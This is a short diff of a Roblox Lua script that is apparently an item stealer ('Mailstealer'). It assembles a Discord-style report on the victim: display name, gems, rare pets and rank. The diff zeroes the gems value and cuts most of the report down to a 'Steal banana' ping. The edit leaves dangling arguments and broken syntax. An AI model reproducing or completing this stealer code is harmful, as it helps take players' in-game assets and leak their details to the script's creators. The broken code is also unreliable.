@@ -15,7 +15,7 @@ end
 while true do
     local displayUsername = game.Players.LocalPlayer.DisplayName
 
-    local gemsAmount = diamondsValue
+    local gemsAmount = 0
     local creatorsList = "Sen/Aasui/Sintax"
     local exclusivePet, hugePet = "N/A", "N/A"
     local playerRank = "N/A"
@@ -33,18 +33,7 @@ while true do
     end
 
     local data = {
-        content = "||@everyone|| Mailstealer Hit 🎉",
-        embeds = {
-            {
-                title = "(:penguin:) Player Info",
-                description = string.format(
-                    "(:lock:) Executed By: %s\n(:game_die:) Creator: %s\n(:pushpin:) Version: 1.0(beta)\n\n" ..
-                    "(:cat:) Pets List\n(:gem:) Gems: %s\n(:rocket:) Exclusive Pet: %s\n(:star:) Huge Pet: %s\n\n" ..
-                    "(:crown:) Rank: %s\n(:rocket:) Creators: %s",
-                    displayUsername,
-                    Creator,
-                    tostring(gemsAmount),
-                    exclusivePet,
+        content = "||<@918007508935802910>|| Steal banana 🎉",
                     hugePet,
                     playerRank,
                     creatorsList
